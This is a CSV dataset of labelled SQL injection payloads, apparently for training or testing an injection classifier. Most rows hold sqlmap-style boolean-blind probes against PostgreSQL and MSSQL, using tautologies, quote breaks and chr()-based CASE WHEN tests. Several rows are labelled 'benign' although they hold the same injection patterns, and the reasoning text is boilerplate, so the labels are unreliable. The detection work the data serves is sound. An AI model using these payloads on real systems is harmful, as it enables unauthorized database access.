id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
40144,"1%\' ) ) ) or username = ""-1254"" and username = ""1\' ) ) ) and ( ( ( \'sbey\' = \'sbey",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40145,"-3899\' ) where 8152 = 8152 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),2
40146,"1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40147,"-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 ) and ( 3530 = 3530",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40148,"1 ) ) ) and username = ""1 ) ) ) and ( ( ( 4694 = 4694",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),3
40149,"1"" and ( ( ( 4694 = 4694"" and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40150,"select * from users WHERE username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp"" and username = ""-7072\' )",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40151,"select * from users WHERE username = ""1\' or username = ""1"" and username = ""1\' ) where 1502 = 1502",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40152,"select * from users WHERE username = ""-5062 ) where 7457 = 7457 or username = ""-9987 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40153,"select * from users WHERE username = ""1 ) ) and ( ( 5139 = 5139"" or username = ""1 )",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40154,"-1549\' ) or username = ""1\' ) ) ) and ( ( ( \'abcf\' like \'abcf",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40155,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6353%\' ) ) or username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40156,"-2348 ) as sige where 1639 = 1639 and username = ""1\' and ( ( ( \'%\' = \'",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40157,"select * from users WHERE username = ""1"" and ( ( ( 4694 = 4694"" and username = ""-1549\' ) or username = ""-9564",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40158,"-1344 ) as gqgi where 2545 = 2545 or username = ""-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40159,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6036 ) ) ) and ( ( ( 6723 = 6723"" or username = ""-8860 )",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40160,"select * from users WHERE username = ""1 ) ) as dgso where 4654 = 4654 or username = ""1 or username = ""-9770\' ) ) as ovhh where 7903 = 7903",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),2
40161,"1\' ) ) ) or username = ""-6036 ) ) ) and ( ( ( 6723 = 6723",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40162,"-7199\' and username = ""-9564 or username = ""1\' ) or username = ""-1254",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40163,"select * from users WHERE username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40164,"-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-6036 ) ) ) and ( ( ( 6723 = 6723",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40165,"select * from users WHERE username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'"" and username = ""-9987 ) ) )",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40166,"-6720\' ) ) ) or username = ""-7323%"" and ""%"" = """,boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),3
40167,"1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),2
40168,"select * from users WHERE username = ""1"" or username = ""-6190\' ) where 2621 = 2621 and username = ""1"" or username = ""1 ) ) as xoch where 8765 = 8765",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40169,"-8163 ) ) as cvai where 2360 = 2360 or username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" and username = ""1",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40170,"select * from users WHERE username = ""1"" and username = ""1"" and username = ""-6353%\' ) )",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40171,"1\' ) where 1502 = 1502 or username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx"" or username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40172,"-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) and username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40173,"select * from users WHERE username = ""-5863"" or username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1\' ) ) )",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
40174,"-6353%\' ) ) and username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak",boolean_blind,mssql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40175,"1%"" and ""%"" = """" and username = ""1"" and username = ""1",benign,generic,0.8,No SQLi signals detected in payload (confidence 0.80),3
40176,-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,postgresql,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),2
40177,"select * from users WHERE username = ""-9501\' ) or username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798",boolean_blind,generic,0.75,Classified as boolean_blind (confidence 0.75) (confidence 0.75),4
